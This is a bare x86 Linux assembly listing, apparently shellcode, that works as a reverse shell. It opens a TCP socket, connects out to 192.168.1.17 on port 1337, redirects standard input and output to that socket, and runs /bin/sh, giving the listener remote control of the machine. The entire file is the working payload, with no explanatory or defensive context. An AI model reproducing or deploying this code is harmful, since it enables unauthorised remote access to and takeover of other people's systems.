global _start

section .text

_start:
       xor eax, eax
       mov BYTE al, 0x66
       xor ebx, ebx
       push ebx
       inc ebx
       push BYTE 0x1
       push BYTE 0x2
       mov ecx, esp
       int 0x80

       mov edi, eax

       mov BYTE al, 0x66
       inc ebx
       inc ebx
       xor edx, edx
       push DWORD 0x1101a8c0
       push WORD 0x3905
       push WORD 0x2
       mov ecx, esp
       push BYTE 16
       push ecx
       push edi
       mov ecx, esp
       int 0x80

       mov ebx, edi

       push BYTE 0x2
       pop ecx
       _looping:
            mov BYTE al, 0x3F
            int 0x80
            dec ecx
            jns _looping
       
       xor eax, eax
       mov BYTE al, 0xb
       push edx
       push 0x68732f2f
       push 0x6e69622f
       mov ebx, esp
       push edx
       mov edx, esp
       push ebx
       mov ecx, esp
       int 0x80
